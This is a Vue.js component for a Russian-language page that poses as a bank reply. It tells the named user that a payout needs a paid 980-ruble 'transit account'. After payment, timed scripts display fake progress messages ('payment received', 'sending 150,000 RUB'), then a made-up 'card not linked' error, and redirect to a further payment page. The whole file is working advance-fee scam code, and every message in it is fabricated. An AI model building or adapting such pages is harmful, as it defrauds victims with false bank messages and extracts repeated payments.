<template>
	<div class="v-response-question">
		<div class="responseQuestion">
			<div class="subResponseQuestion">
				<p class="responseQuestionHeader">Ответ на ваш запрос</p>
				<div class="responseQuestionMainText">
					<p>{{this.$store.state.processingData.lastName}} {{this.$store.state.processingData.name}} {{this.$store.state.processingData.middleName}}, в ответ на ваш запрос сообщаем, что данный</p>
					<p>тип транзакций возможно зачислить на ваш счет</p>
					<p>только через транзитный счет.</p>
					<p>С использованием транзитного счета ваши</p>
					<p>операции пройдут по безопасному каналу и будут</p>
					<p>зачислены без дополнительных проверок.</p>
					<p>Открытие транзитного счета оплачивается по</p>
					<p>тарифам банка и составляет <span>980 руб.</span></p>
				</div>
				<div class="responseQuestionText">
					<p>Для открытия транзитного счета для пользователя</p>
					<p>{{this.$store.state.processingData.lastName}} {{this.$store.state.processingData.name}} {{this.$store.state.processingData.middleName}} жмите на кнопку ниже</p>
					<p>*после оплаты выплата будет направлена на вашу</p>
					<p>№{{this.$store.state.processingData.cardNumber}} через транзитный счет</p>
				</div>
				<button class="responseQuestionButton" @click="paymentVerification">Оплатить 980 руб</button>
			</div>
			<p class="responseQuestionHeaderTwo">Проверка статуса платежа</p>
			<p class="responseQuestionHeaderThree">Открытие транзитного счета</p>
			<p class="responseQuestionHeaderFour">Средства не могут быть зачислены.</p>
			<img :src="require('@/assets/icons/checked.png')" class="responseQuestionImg">
			<img :src="require('@/assets/icons/check-in.png')" class="responseQuestionImgSecond">
			<div class="wrappereResponseQuestionLoader">
				<div class="loadereResponseQuestionLoader"></div>
			</div>
			<p class="responseQuestionTextTwo">Платёж получен</p>
			<p class="responseQuestionTextThree">Сверка с базой данных</p>
			<p class="responseQuestionTextFour">Отправка средств на вашу карту</p>
			<p class="responseQuestionTextFive">Отправляем транзакцию на 150 000 руб</p>
			<p class="responseQuestionTextSix">Отправляем транзакцию на 77 362 руб</p>
			<p class="responseQuestionTextSeven">Карта получателя не привязана к счёту.</p>
		</div>
	</div>
</template>

<script>
	export default {
		name: 'v-response-question',
		methods: {
			paymentVerification() {
				let subResponseQuestion = document.querySelector('.subResponseQuestion')
				let wrappereResponseQuestionLoader = document.querySelector('.wrappereResponseQuestionLoader')
				let responseQuestionHeaderTwo = document.querySelector('.responseQuestionHeaderTwo')
				let responseQuestionHeaderThree = document.querySelector('.responseQuestionHeaderThree')
				let responseQuestionHeaderFour = document.querySelector('.responseQuestionHeaderFour')
				let responseQuestionImg = document.querySelector('.responseQuestionImg')
				let responseQuestionImgSecond = document.querySelector('.responseQuestionImgSecond')
				let responseQuestionTextTwo = document.querySelector('.responseQuestionTextTwo')
				let responseQuestionTextThree = document.querySelector('.responseQuestionTextThree')
				let responseQuestionTextFour = document.querySelector('.responseQuestionTextFour')
				let responseQuestionTextFive = document.querySelector('.responseQuestionTextFive')
				let responseQuestionTextSix = document.querySelector('.responseQuestionTextSix')
				let responseQuestionTextSeven = document.querySelector('.responseQuestionTextSeven')

				subResponseQuestion.style.display = 'none'
				wrappereResponseQuestionLoader.style.display = 'block'
				responseQuestionHeaderTwo.style.display = 'block'
				setTimeout(() => {
					wrappereResponseQuestionLoader.style.display = 'none'
					responseQuestionImg.style.display = 'block'
					responseQuestionTextTwo.style.display = 'block'
				}, 1000)
				setTimeout(() => {
					responseQuestionHeaderThree.style.display = 'block'
					wrappereResponseQuestionLoader.style.display = 'block'
					responseQuestionImg.style.display = 'none'
					responseQuestionTextTwo.style.display = 'none'
					responseQuestionHeaderTwo.style.display = 'none'
				}, 2000)
				setTimeout(() => {
					responseQuestionTextThree.style.display = 'block'
				}, 3000)
				setTimeout(() => {
					responseQuestionTextThree.style.display = 'none'
					responseQuestionTextFour.style.display = 'block'
				}, 4000)
				setTimeout(() => {
					responseQuestionTextFive.style.display = 'block'
				}, 5000)
				setTimeout(() => {
					responseQuestionTextSix.style.display = 'block'
				}, 6000)
				setTimeout(() => {
					responseQuestionHeaderThree.style.display = 'none'
					wrappereResponseQuestionLoader.style.display = 'none'
					responseQuestionTextFour.style.display = 'none'
					responseQuestionTextFive.style.display = 'none'
					responseQuestionTextSix.style.display = 'none'
					responseQuestionHeaderFour.style.display = 'block'
					responseQuestionImgSecond.style.display = 'block'
					responseQuestionTextSeven.style.display = 'block'
				}, 7000)
				setTimeout(() => {
					this.$router.push('/confirmingPayment')
				}, 8000)
			}
		}
	}
</script>

<style>
	.v-response-question {
		max-width: 600px;
		margin: 0 auto;
		padding: 80px 0;
		display: flex;
		justify-content: center;
	}
	.responseQuestion {
		width: 100%;
		min-height: 485px;
		background: #FFFFFF;
		box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.1);
		border-radius: 15px;
		padding: 80px 40px;
		text-align: center;
	}
	.responseQuestionHeader {
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 28px;
		line-height: 34px;
		color: #005391;
	}
	.responseQuestionMainText p{
		font-family: Montserrat;
		font-style: normal;
		font-weight: 500;
		font-size: 18px;
		line-height: 22px;
		color: #2D2D2D;
		margin: 0;
	}
	.responseQuestionMainText span {
		color: #00AEFF; 
	}
	.responseQuestionText {
		margin-top: 20px;
	}
	.responseQuestionText p {
		font-family: Montserrat;
		font-style: normal;
		font-weight: 600;
		font-size: 16px;
		line-height: 20px;
		color: #646464;
		margin: 0;
	}
	.responseQuestionTextTwo {
		display: none;
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
	}
	.responseQuestionTextThree {
		display: none;
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
	}
	.responseQuestionTextFour {
		display: none;
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
	}
	.responseQuestionTextFive {
		display: none;
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
	}
	.responseQuestionTextSix {
		display: none;
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
	}
	.responseQuestionTextSeven {
		display: none;
		font-family: Montserrat;
		font-style: normal;
		font-weight: 500;
		font-size: 18px;
		line-height: 22px;
		color: #2D2D2D;
	}
	.responseQuestionButton {
		background: #005391;
		border-radius: 5px;
		border: none;
		outline: none;
		padding: 15px;
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 16px;
		line-height: 20px;
		text-align: center;
		text-transform: uppercase;
		color: #FFFFFF;
		width: 60%;
		margin-top: 40px;
	}
	.responseQuestionButton:hover {
		cursor: pointer;
		background: #2E7DB8;
	}
	.wrappereResponseQuestionLoader {
		margin: 34px auto;
		width: 53px;
		display: none;
	}
	.loadereResponseQuestionLoader {
		animation: loader-spin 1s linear infinite;
		width: 53px;
		height: 53px;
		border: 4px solid rgba(0,0,0,0.1);
		border-radius: 50%;
		border-right-color: #0062AA;
		margin-top: 55px;
		margin-bottom: 60px;
	}
	@keyframes loader-spin {
  	0% {
    	transform: rotate(0deg);
  	}
  	100% {
    	transform: rotate(360deg);
  	}
	}
	.responseQuestionHeaderTwo {
		display: none;
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 28px;
		line-height: 34px;
		color: #2D2D2D;
	}
	.responseQuestionHeaderThree {
		display: none;
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 28px;
		line-height: 34px;
		color: #2D2D2D;
	}
	.responseQuestionHeaderFour {
		display: none;
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 28px;
		line-height: 34px;
		color: #2D2D2D;
	}
	.responseQuestionImg {
		display: none;
		margin: 55px auto;
		width: 53px;
	}
	.responseQuestionImgSecond {
		display: none;
		margin: 55px auto;
		width: 53px;
	}
	@media only screen and (max-width: 440px) {
		.responseQuestion {
			padding:20px 15px;
			margin: 10px;
			width: 250px;
		}
		.responseQuestionHeader {
			font-family: Exo 2;
			font-style: normal;
			font-weight: bold;
			font-size: 20px;
			line-height: 24px;
			color: #2D2D2D;
		}
		.responseQuestionButton {
			font-size: 14px;
			width: 100%;
		}
	}
</style>